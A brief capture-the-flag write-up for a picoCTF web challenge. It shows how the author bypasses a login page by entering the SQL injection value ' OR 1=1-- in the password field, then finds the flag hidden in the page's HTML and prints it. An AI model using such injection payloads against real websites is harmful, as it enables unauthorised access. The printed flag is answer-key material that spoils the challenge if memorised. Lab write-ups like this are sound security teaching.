Problem Statement: Can you login to this website? Start instance, then http://saturn.picoctf.net:62961/

My Process / Solution

1) After connecting to the instance, we are presented with a simple login page. Trying a random username and password reveals an authentication failed page with what looks like debugging enabled:

username: rrr
password: rrr
SQL query: SELECT * FROM users WHERE name='rrr' AND password='rrr'

2) Using username:admin and password:' OR 1=1-- gives us:

username: admin
password: ' OR 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1--'
Logged in! But can you see the flag, it is in plainsight.

3) There's a hidden paragraph <p> with the flag on the page accessible by inspecting the HTML.

Flag: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
